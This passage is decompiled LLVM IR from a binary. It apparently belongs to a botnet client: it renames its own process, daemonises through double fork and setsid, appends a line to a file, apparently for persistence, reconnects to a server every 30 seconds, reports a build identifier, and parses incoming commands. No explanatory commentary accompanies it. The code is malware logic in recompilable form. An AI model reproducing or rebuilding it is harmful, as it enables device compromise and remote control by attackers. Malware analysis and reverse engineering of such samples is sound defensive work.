  br i1 %v4_10009bc8, label %dec_label_pc_10009bd0, label %dec_label_pc_10009bdc

dec_label_pc_10009bd0:                            ; preds = %dec_label_pc_10009b98
  br label %dec_label_pc_10009d3c

dec_label_pc_10009bdc:                            ; preds = %dec_label_pc_10009b98
  store i32 268475388, i32* @lr, align 4
  %v3_10009bf8 = call i32 @__libc_open(i32 ptrtoint ([16 x i8]* @global_var_1001c1b4.783 to i32), i32 0)
  %v2_10009c7c = ptrtoint i8* %stack_var_-4160 to i32
  br label %dec_label_pc_10009c7c

dec_label_pc_10009c08:                            ; preds = %dec_label_pc_10009c7c
  store i32 268475420, i32* @lr, align 4
  %v5_10009c18 = call i32 @strstr(i32 %v2_10009c7c, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1001c1c4.784, i32 0, i32 0), i32 268566528)
  %v3_10009c20 = icmp eq i32 %v5_10009c18, 0
  br i1 %v3_10009c20, label %dec_label_pc_10009c64, label %dec_label_pc_10009c40.preheader

dec_label_pc_10009c40.preheader:                  ; preds = %dec_label_pc_10009c08
  %v2_10009c4410 = load i8, i8* %stack_var_-4160, align 1
  %v3_10009c4c14 = icmp eq i8 %v2_10009c4410, 9
  br i1 %v3_10009c4c14, label %dec_label_pc_10009c54, label %dec_label_pc_10009c34

dec_label_pc_10009c34:                            ; preds = %dec_label_pc_10009c40.preheader, %dec_label_pc_10009c34
  %v4_10009c4015 = phi i32 [ %v1_10009c38, %dec_label_pc_10009c34 ], [ %v2_10009c7c, %dec_label_pc_10009c40.preheader ]
  %v1_10009c38 = add i32 %v4_10009c4015, 1
  %v5_10009c3c = inttoptr i32 %v1_10009c38 to i8*
  %v2_10009c44 = load i8, i8* %v5_10009c3c, align 1
  %v3_10009c4c = icmp eq i8 %v2_10009c44, 9
  br i1 %v3_10009c4c, label %dec_label_pc_10009c54, label %dec_label_pc_10009c34

dec_label_pc_10009c54:                            ; preds = %dec_label_pc_10009c34, %dec_label_pc_10009c40.preheader
  %storemerge4.lcssa = phi i8* [ %stack_var_-4160, %dec_label_pc_10009c40.preheader ], [ %v5_10009c3c, %dec_label_pc_10009c34 ]
  store i8 0, i8* %storemerge4.lcssa, align 1
  br label %dec_label_pc_10009c9c

dec_label_pc_10009c64:                            ; preds = %dec_label_pc_10009c08
  store i32 268475516, i32* @lr, align 4
  %v3_10009c78 = call i32 @__GI_memset(i32 %v2_10009c7c, i32 0, i32 4096)
  br label %dec_label_pc_10009c7c

dec_label_pc_10009c7c:                            ; preds = %dec_label_pc_10009bdc, %dec_label_pc_10009c64
  %v3_10009c8c = call i32 @fdgets(i32 %v2_10009c7c, i32 4096, i32 %v3_10009bf8)
  %v3_10009c94 = icmp eq i32 %v3_10009c8c, 0
  br i1 %v3_10009c94, label %dec_label_pc_10009c9c, label %dec_label_pc_10009c08

dec_label_pc_10009c9c:                            ; preds = %dec_label_pc_10009c7c, %dec_label_pc_10009c54
  store i32 268475556, i32* @lr, align 4
  %v1_10009ca0 = call i32 @__libc_close(i32 %v3_10009bf8)
  %v3_10009ca4 = load i8, i8* %stack_var_-4160, align 1
  %v3_10009cac = icmp eq i8 %v3_10009ca4, 0
  br i1 %v3_10009cac, label %dec_label_pc_10009d30, label %dec_label_pc_10009cb4

dec_label_pc_10009cb4:                            ; preds = %dec_label_pc_10009c9c
  %v2_10009cb4 = ptrtoint i32* %stack_var_-64 to i32
  %v3_10009cc4 = call i32 @strcpy(i32 %v2_10009cb4, i8* nonnull %stack_var_-4160)
  store i32 ptrtoint (i32* @global_var_10009ce4.785 to i32), i32* @lr, align 4
  %v3_10009ce0 = call i32 @ioctl(i32 %v3_10009ae8, i32 35111, i32 %v2_10009cb4)
  %v2_10009cf8 = ptrtoint i32* %stack_var_-46 to i32
  br label %dec_label_pc_10009cf0

dec_label_pc_10009cf0:                            ; preds = %dec_label_pc_10009cb4, %dec_label_pc_10009cf0
  %storemerge58 = phi i32 [ 0, %dec_label_pc_10009cb4 ], [ %v1_10009d1c, %dec_label_pc_10009cf0 ]
  %v2_10009d00 = add i32 %storemerge58, %v2_10009cf8
  %v1_10009d04 = inttoptr i32 %v2_10009d00 to i8*
  %v2_10009d04 = load i8, i8* %v1_10009d04, align 1
  %v4_10009d14 = add i32 %storemerge58, ptrtoint (i32* @global_var_1002e5f8.786 to i32)
  %v5_10009d14 = inttoptr i32 %v4_10009d14 to i8*
  store i8 %v2_10009d04, i8* %v5_10009d14, align 1
  %v1_10009d1c = add nuw nsw i32 %storemerge58, 1
  %tmp37 = icmp slt i32 %v1_10009d1c, 6
  br i1 %tmp37, label %dec_label_pc_10009cf0, label %dec_label_pc_10009d30

dec_label_pc_10009d30:                            ; preds = %dec_label_pc_10009cf0, %dec_label_pc_10009c9c
  store i32 ptrtoint (i32* @global_var_10009d38.787 to i32), i32* @lr, align 4
  %v1_10009d34 = call i32 @__libc_close(i32 %v3_10009ae8)
  br label %dec_label_pc_10009d44

dec_label_pc_10009d3c:                            ; preds = %dec_label_pc_10009bd0, %dec_label_pc_10009b8c, %dec_label_pc_10009b04
  br label %dec_label_pc_10009d44

dec_label_pc_10009d44:                            ; preds = %dec_label_pc_10009d30, %dec_label_pc_10009d3c
  %stack_var_-20.0 = phi i32 [ 0, %dec_label_pc_10009d3c ], [ %tmp, %dec_label_pc_10009d30 ]
  ret i32 %stack_var_-20.0

; uselistorder directives
  uselistorder i32 %storemerge58, { 2, 1, 0 }
  uselistorder i32 %v1_10009c38, { 1, 0 }
  uselistorder i32 %v2_10009c7c, { 3, 1, 0, 2 }
  uselistorder i32 %v3_10009ae8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4164, { 1, 0 }
  uselistorder i8* %stack_var_-4160, { 2, 4, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @htons, { 12, 11, 1, 10, 9, 8, 7, 6, 5, 13, 4, 3, 2, 0 }
  uselistorder label %dec_label_pc_10009d44, { 1, 0 }
  uselistorder label %dec_label_pc_10009cf0, { 1, 0 }
  uselistorder label %dec_label_pc_10009c7c, { 1, 0 }
  uselistorder label %dec_label_pc_10009c34, { 1, 0 }
}

define i32 @getBuild(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_1001c1d0.788 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-4192 = alloca i32, align 4
  %stack_var_-5816 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-5732 = alloca i32, align 4
  %stack_var_-5216 = alloca i32, align 4
  %stack_var_-5472 = alloca i32, align 4
  %stack_var_-5728 = alloca i32, align 4
  %v1_10009dbc = bitcast i8** %argv to i32*
  %v2_10009dbc = load i32, i32* %v1_10009dbc, align 4
  store i32 %v2_10009dbc, i32* @r3, align 4
  %v0_10009dd0 = call i32 @__GI_strlen()
  store i32 ptrtoint (i32* @global_var_1001c1d8.789 to i32), i32* @r4, align 4
  store i32 268475884, i32* @lr, align 4
  %v3_10009de8 = call i32 @strncpy(i32 %v2_10009dbc, i32 ptrtoint (i32* @global_var_1001c1d8.789 to i32), i32 %v0_10009dd0)
  store i32 ptrtoint (i32* @global_var_1001c1d8.789 to i32), i32* %v1_10009dbc, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10009e1c.790 to i32), i32* @lr, align 4
  %v7_10009e18 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_1001c1d8.789 to i32), i32 0, i32 0, i32 0, i32 %tmp)
  store i32 268475940, i32* @lr, align 4
  %v1_10009e20 = call i32 @__GI_time(i32 0)
  store i32 268475948, i32* @lr, align 4
  %v0_10009e28 = call i32 @__libc_getpid()
  %v2_10009e30 = xor i32 %v1_10009e20, %v0_10009e28
  store i32 ptrtoint ([3 x i8]* @global_var_10009e3c.791 to i32), i32* @lr, align 4
  %v1_10009e38 = call i32 @srand(i32 %v2_10009e30)
  store i32 268475972, i32* @lr, align 4
  %v1_10009e40 = call i32 @__GI_time(i32 0)
  store i32 268475980, i32* @lr, align 4
  %v0_10009e48 = call i32 @__libc_getpid()
  %v2_10009e50 = xor i32 %v1_10009e40, %v0_10009e48
  %v1_10009e58 = call i32 @init_rand(i32 %v2_10009e50)
  store i32 268476032, i32* @lr, align 4
  %v3_10009e7c = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1001c1dc.793 to i32), i32 ptrtoint ([2 x i8]* @global_var_1001c1f0.794 to i32))
  %v3_10009e8c = icmp eq i32 %v3_10009e7c, 0
  br i1 %v3_10009e8c, label %dec_label_pc_10009e94, label %dec_label_pc_10009eb8

dec_label_pc_10009e94:                            ; preds = %entry
  store i32 268476080, i32* @lr, align 4
  %v3_10009eac = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1001c1f4.795 to i32), i32 ptrtoint ([2 x i8]* @global_var_1001c1f0.794 to i32))
  br label %dec_label_pc_10009eb8

dec_label_pc_10009eb8:                            ; preds = %entry, %dec_label_pc_10009e94
  %stack_var_-5756.0 = phi i32 [ %v3_10009eac, %dec_label_pc_10009e94 ], [ %v3_10009e7c, %entry ]
  %stack_var_-5752.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001c1f4.795, i32 0, i32 0), %dec_label_pc_10009e94 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1001c1dc.793, i32 0, i32 0), %entry ]
  %v3_10009ebc = icmp eq i32 %stack_var_-5756.0, 0
  br i1 %v3_10009ebc, label %dec_label_pc_1000a038, label %dec_label_pc_10009ec4

dec_label_pc_10009ec4:                            ; preds = %dec_label_pc_10009eb8
  %v2_10009ec8 = load i32, i32* %v1_10009dbc, align 4
  store i32 %v2_10009ec8, i32* @r3, align 4
  %v0_10009ed0 = call i32 @__GI_strlen()
  %v2_10009ee4 = ptrtoint i32* %stack_var_-5728 to i32
  store i32 268476148, i32* @lr, align 4
  %v2_10009ef0 = call i32 @getcwd(i32 %v2_10009ee4, i32 256)
  store i32 ptrtoint (i32* @global_var_1001c204.796 to i32), i32* @r4, align 4
  %v2_10009f04 = bitcast i32* %stack_var_-5728 to i8*
  %v3_10009f04 = call i32 @__GI_strcoll(i8* %v2_10009f04, i32 ptrtoint (i32* @global_var_1001c204.796 to i32))
  %v3_10009f0c = icmp eq i32 %v3_10009f04, 0
  br i1 %v3_10009f0c, label %dec_label_pc_1000a030, label %dec_label_pc_10009f24.preheader

dec_label_pc_10009f24.preheader:                  ; preds = %dec_label_pc_10009ec4
  %v2_10009f28115 = load i32, i32* %v1_10009dbc, align 4
  %v2_10009f30116 = add i32 %v2_10009f28115, %v0_10009ed0
  %v1_10009f34117 = inttoptr i32 %v2_10009f30116 to i8*
  %v2_10009f34118 = load i8, i8* %v1_10009f34117, align 1
  %v3_10009f3c122 = icmp eq i8 %v2_10009f34118, 47
  br i1 %v3_10009f3c122, label %dec_label_pc_10009f44, label %dec_label_pc_10009f18

dec_label_pc_10009f18:                            ; preds = %dec_label_pc_10009f24.preheader, %dec_label_pc_10009f18
  %stack_var_-5760.0123 = phi i32 [ %v1_10009f1c, %dec_label_pc_10009f18 ], [ %v0_10009ed0, %dec_label_pc_10009f24.preheader ]
  %v1_10009f1c = add i32 %stack_var_-5760.0123, -1
  %v2_10009f28 = load i32, i32* %v1_10009dbc, align 4
  %v2_10009f30 = add i32 %v2_10009f28, %v1_10009f1c
  %v1_10009f34 = inttoptr i32 %v2_10009f30 to i8*
  %v2_10009f34 = load i8, i8* %v1_10009f34, align 1
  %v3_10009f3c = icmp eq i8 %v2_10009f34, 47
  br i1 %v3_10009f3c, label %dec_label_pc_10009f44, label %dec_label_pc_10009f18

dec_label_pc_10009f44:                            ; preds = %dec_label_pc_10009f18, %dec_label_pc_10009f24.preheader
  %stack_var_-5760.0.lcssa = phi i32 [ %v0_10009ed0, %dec_label_pc_10009f24.preheader ], [ %v1_10009f1c, %dec_label_pc_10009f18 ]
  %v2_10009f48 = load i32, i32* %v1_10009dbc, align 4
  %v2_10009f50 = add i32 %v2_10009f48, %stack_var_-5760.0.lcssa
  %v2_10009f54 = ptrtoint i32* %stack_var_-5472 to i32
  store i32 %v2_10009f54, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10009f78.798 to i32), i32* @lr, align 4
  %v6_10009f74 = load i32, i32* @r8, align 4
  %v9_10009f74 = call i32 @sprintf(i32 %v2_10009f54, i32 ptrtoint ([8 x i8]* @global_var_1001c208.797 to i32), i32 %v2_10009ee4, i32 %v2_10009f50, i32 268566528, i32 %v6_10009f74, i32 268566528, i32 ptrtoint (i32* @0 to i32))
  %v2_10009f7c = ptrtoint i32* %stack_var_-5216 to i32
  br label %dec_label_pc_10009fbc.outer

dec_label_pc_10009f7c:                            ; preds = %dec_label_pc_10009fbc
  store i32 268476304, i32* @lr, align 4
  %v3_10009f8c = call i32 @fgets(i32 %v2_10009f7c, i32 1024, i32 %stack_var_-5756.0)
  store i32 %v2_10009f7c, i32* @r3, align 4
  store i32 %v2_10009f54, i32* @r4, align 4
  %v2_10009fa0 = call i32 @__GI_strcasecmp(i32 %v2_10009f7c, i32 %v2_10009f54)
  %v3_10009fa8 = icmp eq i32 %v2_10009fa0, 0
  br i1 %v3_10009fa8, label %dec_label_pc_10009fb0, label %dec_label_pc_10009fbc

dec_label_pc_10009fb0:                            ; preds = %dec_label_pc_10009f7c
  %v1_10009fb4 = add i32 %stack_var_-5764.0.ph, 1
  br label %dec_label_pc_10009fbc.outer

dec_label_pc_10009fbc.outer:                      ; preds = %dec_label_pc_10009fb0, %dec_label_pc_10009f44
  %stack_var_-5764.0.ph = phi i32 [ %v1_10009fb4, %dec_label_pc_10009fb0 ], [ 0, %dec_label_pc_10009f44 ]
  br label %dec_label_pc_10009fbc

dec_label_pc_10009fbc:                            ; preds = %dec_label_pc_10009fbc.outer, %dec_label_pc_10009f7c
  store i32 268476356, i32* @lr, align 4
  %v1_10009fc0 = call i32 @feof(i32 %stack_var_-5756.0)
  %v3_10009fc8 = icmp eq i32 %v1_10009fc0, 0
  br i1 %v3_10009fc8, label %dec_label_pc_10009f7c, label %dec_label_pc_10009fd0

dec_label_pc_10009fd0:                            ; preds = %dec_label_pc_10009fbc
  %v3_10009fd4 = icmp eq i32 %stack_var_-5764.0.ph, 0
  br i1 %v3_10009fd4, label %dec_label_pc_10009fdc, label %dec_label_pc_1000a024

dec_label_pc_10009fdc:                            ; preds = %dec_label_pc_10009fd0
  store i32 268476388, i32* @lr, align 4
  %v1_10009fe0 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_10009fe0 = call i32 @__GI_fclose(i16* %v1_10009fe0)
  %v4_10009fe4 = ptrtoint i8* %stack_var_-5752.0 to i32
  store i32 268476404, i32* @lr, align 4
  %v3_10009ff0 = call i32 @__GI_fopen(i32 %v4_10009fe4, i32 ptrtoint (i32* @global_var_1001c210.799 to i32))
  %v3_1000a000 = icmp eq i32 %v3_10009ff0, 0
  br i1 %v3_1000a000, label %dec_label_pc_1000a038, label %dec_label_pc_1000a008

dec_label_pc_1000a008:                            ; preds = %dec_label_pc_10009fdc
  store i32 268476440, i32* @lr, align 4
  %v2_1000a014 = call i32 @__GI_fputs(i32 %v2_10009f54, i32 %v3_10009ff0)
  store i32 ptrtoint (i32* @global_var_1000a020.800 to i32), i32* @lr, align 4
  %v1_1000a01c = inttoptr i32 %v3_10009ff0 to i16*
  %v2_1000a01c = call i32 @__GI_fclose(i16* %v1_1000a01c)
  br label %dec_label_pc_1000a038

dec_label_pc_1000a024:                            ; preds = %dec_label_pc_10009fd0
  store i32 ptrtoint (i32* @global_var_1000a02c.801 to i32), i32* @lr, align 4
  %v1_1000a028 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_1000a028 = call i32 @__GI_fclose(i16* %v1_1000a028)
  br label %dec_label_pc_1000a038

dec_label_pc_1000a030:                            ; preds = %dec_label_pc_10009ec4
  store i32 268476472, i32* @lr, align 4
  %v1_1000a034 = inttoptr i32 %stack_var_-5756.0 to i16*
  %v2_1000a034 = call i32 @__GI_fclose(i16* %v1_1000a034)
  br label %dec_label_pc_1000a038

dec_label_pc_1000a038:                            ; preds = %dec_label_pc_10009fdc, %dec_label_pc_10009eb8, %dec_label_pc_1000a024, %dec_label_pc_1000a008, %dec_label_pc_1000a030
  store i32 ptrtoint (i32* @global_var_1000a03c.802 to i32), i32* @lr, align 4
  %v0_1000a038 = call i32 @getOurIP()
  store i32 268476480, i32* @lr, align 4
  %v0_1000a03c = call i32 @__libc_fork()
  %v3_1000a04c = icmp eq i32 %v0_1000a03c, 0
  br i1 %v3_1000a04c, label %dec_label_pc_1000a07c, label %dec_label_pc_1000a0c0

dec_label_pc_1000a07c:                            ; preds = %dec_label_pc_1000a038
  store i32 268476544, i32* @lr, align 4
  %v0_1000a07c = call i32 @__libc_fork()
  %v3_1000a08c = icmp eq i32 %v0_1000a07c, 0
  br i1 %v3_1000a08c, label %dec_label_pc_1000a09c.thread, label %dec_label_pc_1000a0a8

dec_label_pc_1000a09c.thread:                     ; preds = %dec_label_pc_1000a07c
  br label %dec_label_pc_1000a0d4

dec_label_pc_1000a0a8:                            ; preds = %dec_label_pc_1000a07c
  %v0_1000a098 = call i32 @__GI_exit()
  %v3_1000a0b8 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1001c214.804 to i32), i32 268566528)
  br label %dec_label_pc_1000a0d4

dec_label_pc_1000a0c0:                            ; preds = %dec_label_pc_1000a038
  %v2_1000a054 = ptrtoint i32* %stack_var_-5732 to i32
  store i32 ptrtoint ([3 x i8]* @global_var_1000a068.803 to i32), i32* @lr, align 4
  %v3_1000a064 = call i32 @__libc_waitpid(i32 %v0_1000a03c, i32 %v2_1000a054, i32 0)
  %v0_1000a06c = call i32 @__GI_exit()
  %v3_1000a0d0 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1001c214.804 to i32), i32 268566528)
  br label %dec_label_pc_1000a0d4

dec_label_pc_1000a0d4:                            ; preds = %dec_label_pc_1000a09c.thread, %dec_label_pc_1000a0a8, %dec_label_pc_1000a0c0
  store i32 268476632, i32* @lr, align 4
  %v0_1000a0d4 = call i32 @__GI_setsid()
  store i32 ptrtoint ([3 x i8]* @global_var_1000a0e4.807 to i32), i32* @lr, align 4
  %v2_1000a0e0 = call i32 @chdir(i32 ptrtoint (i32* @global_var_1001c204.796 to i32), i32 268566528)
  store i32 ptrtoint (i32* @global_var_1000a0f0.808 to i32), i32* @lr, align 4
  %v2_1000a0ec = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_1000a978 = ptrtoint i32* %stack_var_-4192 to i32
  %v4_1000a988 = bitcast i32* %stack_var_-4192 to i8*
  %v2_1000a440 = ptrtoint i32* %stack_var_-5816 to i32
  %v2_1000a710 = ptrtoint i32* %stack_var_-5216 to i32
  %v1_1000a57c = or i32 %v2_1000a978, 1
  %v2_1000a940 = add i32 %v2_1000a440, 344
  br label %dec_label_pc_1000a0f4.outer

dec_label_pc_1000a0f4.outer:                      ; preds = %dec_label_pc_1000a4c4, %dec_label_pc_1000a970, %dec_label_pc_1000a0d4
  %stack_var_-5748.0.ph21 = phi i32 [ 0, %dec_label_pc_1000a0d4 ], [ %stack_var_-5748.2.ph, %dec_label_pc_1000a970 ], [ %v1_1000a4c8, %dec_label_pc_1000a4c4 ]
  %v0_1000a0f425 = call i32 @initConnection()
  %v3_1000a0fc28 = icmp eq i32 %v0_1000a0f425, 0
  br i1 %v3_1000a0fc28, label %dec_label_pc_1000a110, label %dec_label_pc_1000a104

dec_label_pc_1000a104:                            ; preds = %dec_label_pc_1000a0f4.outer, %dec_label_pc_1000a104
  store i32 268476684, i32* @lr, align 4
  %v1_1000a108 = call i32 @sleep(i32 30)
  %v0_1000a0f4 = call i32 @initConnection()
  %v3_1000a0fc = icmp eq i32 %v0_1000a0f4, 0
  br i1 %v3_1000a0fc, label %dec_label_pc_1000a110, label %dec_label_pc_1000a104

dec_label_pc_1000a110:                            ; preds = %dec_label_pc_1000a104, %dec_label_pc_1000a0f4.outer
  %v1_1000a118 = call i32 @getBuild(i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v3_1000a124 = load i32, i32* @global_var_1002e610.172, align 4
  store i32 %v3_1000a124, i32* %stack_var_-80, align 4
  store i32 268476728, i32* @lr, align 4
  %v3_1000a134 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v0_1000a13c = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000a158.810 to i32), i32* @lr, align 4
  %v6_1000a154 = call i32 @sockprintf(i32 %v0_1000a13c, i32 ptrtoint ([16 x i8]* @global_var_1001c224.809 to i32), i32 %v1_1000a118)
  br label %dec_label_pc_1000a970.outer

dec_label_pc_1000a178:                            ; preds = %dec_label_pc_1000a42c, %dec_label_pc_1000a3d0
  %v1_1000a17c = mul i32 %storemerge12, 4
  %v3_1000a188 = load i32, i32* @global_var_1002e61c.50, align 4
  %v2_1000a18c = add i32 %v3_1000a188, %v1_1000a17c
  %v1_1000a190 = inttoptr i32 %v2_1000a18c to i32*
  %v2_1000a190 = load i32, i32* %v1_1000a190, align 4
  store i32 268476836, i32* @lr, align 4
  %v3_1000a1a0 = call i32 @__libc_waitpid(i32 %v2_1000a190, i32 0, i32 1)
  %tmp110 = icmp slt i32 %v3_1000a1a0, 1
  br i1 %tmp110, label %dec_label_pc_1000a3c4, label %dec_label_pc_1000a208

dec_label_pc_1000a1c0:                            ; preds = %dec_label_pc_1000a208, %dec_label_pc_1000a250
  %v1_1000a1c4 = mul i32 %v1_1000a1b4, 4
  %v3_1000a1d0 = load i32, i32* @global_var_1002e61c.50, align 4
  %v2_1000a1d4 = add i32 %v3_1000a1d0, %v1_1000a1c4
  %v1_1000a1d8 = add i32 %v2_1000a1d4, -4
  %v1_1000a1f4 = inttoptr i32 %v2_1000a1d4 to i32*
  %v2_1000a1f4 = load i32, i32* %v1_1000a1f4, align 4
  %v2_1000a1f8 = inttoptr i32 %v1_1000a1d8 to i32*
  store i32 %v2_1000a1f4, i32* %v2_1000a1f8, align 4
  br label %dec_label_pc_1000a208

dec_label_pc_1000a208:                            ; preds = %dec_label_pc_1000a178, %dec_label_pc_1000a1c0
  %storemerge18 = phi i32 [ %v1_1000a1b4, %dec_label_pc_1000a1c0 ], [ %storemerge12, %dec_label_pc_1000a178 ]
  %v1_1000a1b4 = add i32 %storemerge18, 1
  %v2_1000a230 = load i32, i32* @global_var_1002e5f0.48, align 4
  %v3_1000a248 = icmp eq i32 %v2_1000a230, 0
  br i1 %v3_1000a248, label %dec_label_pc_1000a250, label %dec_label_pc_1000a1c0

dec_label_pc_1000a250:                            ; preds = %dec_label_pc_1000a208
  %v3_1000a234 = load i32, i32* @global_var_1002e5f4.49, align 4
  %v3_1000a268 = icmp ugt i32 %v3_1000a234, %v1_1000a1b4
  br i1 %v3_1000a268, label %dec_label_pc_1000a1c0, label %dec_label_pc_1000a270

dec_label_pc_1000a270:                            ; preds = %dec_label_pc_1000a250
  %v1_1000a274 = mul i32 %v1_1000a1b4, 4
  %v3_1000a280 = load i32, i32* @global_var_1002e61c.50, align 4
  %v2_1000a284 = add i32 %v1_1000a274, -4
  %v1_1000a288 = add i32 %v2_1000a284, %v3_1000a280
  %v2_1000a290 = inttoptr i32 %v1_1000a288 to i32*
  store i32 0, i32* %v2_1000a290, align 4
  %v3_1000a29c = load i32, i32* @global_var_1002e5f4.49, align 4
  %v2_1000a2a0 = load i32, i32* @global_var_1002e5f0.48, align 4
  %v1_1000a2a4 = add i32 %v3_1000a29c, -1
  %v2_1000a2a4 = icmp ne i32 %v3_1000a29c, 0
  %v2_1000a2a8 = zext i1 %v2_1000a2a4 to i32
  %v3_1000a2a8 = add i32 %v2_1000a2a0, -1
  %v4_1000a2a8 = add i32 %v3_1000a2a8, %v2_1000a2a8
  store i32 %v4_1000a2a8, i32* @global_var_1002e5f0.48, align 4
  store i32 %v1_1000a2a4, i32* @global_var_1002e5f4.49, align 4
  %v1_1000a2d8 = mul i32 %v1_1000a2a4, 4
  %v1_1000a2e0 = add i32 %v1_1000a2d8, 4
  store i32 %v1_1000a2e0, i32* @r3, align 4
  store i32 268477164, i32* @lr, align 4
  %v0_1000a2e8 = call i32 @malloc()
  br label %dec_label_pc_1000a340

dec_label_pc_1000a300:                            ; preds = %dec_label_pc_1000a340, %dec_label_pc_1000a388
  %v1_1000a304 = mul i32 %storemerge17, 4
  %v2_1000a310 = add i32 %v1_1000a304, %v0_1000a2e8
  %v3_1000a324 = load i32, i32* @global_var_1002e61c.50, align 4
  %v2_1000a328 = add i32 %v3_1000a324, %v1_1000a304
  %v1_1000a32c = inttoptr i32 %v2_1000a328 to i32*
  %v2_1000a32c = load i32, i32* %v1_1000a32c, align 4
  %v2_1000a330 = inttoptr i32 %v2_1000a310 to i32*
  store i32 %v2_1000a32c, i32* %v2_1000a330, align 4
  %v1_1000a338 = add i32 %storemerge17, 1
  br label %dec_label_pc_1000a340

dec_label_pc_1000a340:                            ; preds = %dec_label_pc_1000a270, %dec_label_pc_1000a300
  %storemerge17 = phi i32 [ 0, %dec_label_pc_1000a270 ], [ %v1_1000a338, %dec_label_pc_1000a300 ]
  %v2_1000a368 = load i32, i32* @global_var_1002e5f0.48, align 4
  %v3_1000a380 = icmp eq i32 %v2_1000a368, 0
  br i1 %v3_1000a380, label %dec_label_pc_1000a388, label %dec_label_pc_1000a300

dec_label_pc_1000a388:                            ; preds = %dec_label_pc_1000a340
  %v3_1000a36c = load i32, i32* @global_var_1002e5f4.49, align 4
  %v3_1000a3a0 = icmp ugt i32 %v3_1000a36c, %storemerge17
  br i1 %v3_1000a3a0, label %dec_label_pc_1000a300, label %dec_label_pc_1000a3a8

dec_label_pc_1000a3a8:                            ; preds = %dec_label_pc_1000a388
  %v3_1000a3ac = load i32, i32* @global_var_1002e61c.50, align 4
  store i32 %v3_1000a3ac, i32* @r3, align 4
  store i32 268477368, i32* @lr, align 4
  %v0_1000a3b4 = call i32 @free()
  store i32 %v0_1000a2e8, i32* @global_var_1002e61c.50, align 4
  br label %dec_label_pc_1000a3c4

dec_label_pc_1000a3c4:                            ; preds = %dec_label_pc_1000a178, %dec_label_pc_1000a3a8
  %v1_1000a3c8 = add i32 %storemerge12, 1
  br label %dec_label_pc_1000a3d0

dec_label_pc_1000a3d0:                            ; preds = %dec_label_pc_1000a970, %dec_label_pc_1000a3c4
  %storemerge12 = phi i32 [ %v1_1000a3c8, %dec_label_pc_1000a3c4 ], [ 0, %dec_label_pc_1000a970 ]
  %tmp125 = icmp slt i32 %storemerge12, 0
  %v1_1000a3d4 = zext i1 %tmp125 to i32
  %v2_1000a3d4 = ashr i32 %storemerge12, 31
  %v3_1000a3d4 = and i32 %v2_1000a3d4, -2
  %v4_1000a3d4 = or i32 %v3_1000a3d4, %v1_1000a3d4
  %v2_1000a3fc = load i32, i32* @global_var_1002e5f0.48, align 4
  %v3_1000a400 = load i32, i32* @global_var_1002e5f4.49, align 4
  %v3_1000a414 = icmp ugt i32 %v2_1000a3fc, %v4_1000a3d4
  br i1 %v3_1000a414, label %dec_label_pc_1000a178, label %dec_label_pc_1000a41c

dec_label_pc_1000a41c:                            ; preds = %dec_label_pc_1000a3d0
  %v4_1000a414 = icmp eq i32 %v2_1000a3fc, %v4_1000a3d4
  br i1 %v4_1000a414, label %dec_label_pc_1000a42c, label %dec_label_pc_1000a43c

dec_label_pc_1000a42c:                            ; preds = %dec_label_pc_1000a41c
  %v3_1000a434 = icmp ugt i32 %v3_1000a400, %storemerge12
  br i1 %v3_1000a434, label %dec_label_pc_1000a178, label %dec_label_pc_1000a43c

dec_label_pc_1000a43c:                            ; preds = %dec_label_pc_1000a41c, %dec_label_pc_1000a42c
  %v2_1000a444 = add i32 %v5_1000a988, %v2_1000a440
  %v3_1000a44c = add i32 %v2_1000a444, 1624
  %v4_1000a44c = inttoptr i32 %v3_1000a44c to i8*
  store i8 0, i8* %v4_1000a44c, align 1
  %v1_1000a458 = call i32 @trim(i32 %v2_1000a978)
  store i32 268477552, i32* @lr, align 4
  %v5_1000a46c = call i32 @strstr(i32 %v2_1000a978, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10013cbc.32, i32 0, i32 0), i32 ptrtoint (i32* @global_var_10010000.9 to i32))
  %v4_1000a478 = icmp eq i32 %v5_1000a46c, %v2_1000a978
  br i1 %v4_1000a478, label %dec_label_pc_1000a480, label %dec_label_pc_1000a4a0

dec_label_pc_1000a480:                            ; preds = %dec_label_pc_1000a43c
  %v3_1000a484 = load i32, i32* @global_var_1002e5e8.31, align 4
  store i32 ptrtoint (i32* @global_var_1000a49c.812 to i32), i32* @lr, align 4
  %v4_1000a498 = call i32 @sockprintf(i32 %v3_1000a484, i32 ptrtoint ([5 x i8]* @global_var_1001c234.811 to i32), i32 268566528)
  br label %dec_label_pc_1000a970

dec_label_pc_1000a4a0:                            ; preds = %dec_label_pc_1000a43c
  store i32 268477620, i32* @lr, align 4
  %v5_1000a4b0 = call i32 @strstr(i32 %v2_1000a978, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001c23c.813, i32 0, i32 0), i32 268566528)
  %v4_1000a4bc = icmp eq i32 %v5_1000a4b0, %v2_1000a978
  br i1 %v4_1000a4bc, label %dec_label_pc_1000a4c4, label %dec_label_pc_1000a4f8

dec_label_pc_1000a4c4:                            ; preds = %dec_label_pc_1000a4a0
  %v1_1000a4c8 = add i32 %stack_var_-5748.2.ph, 1
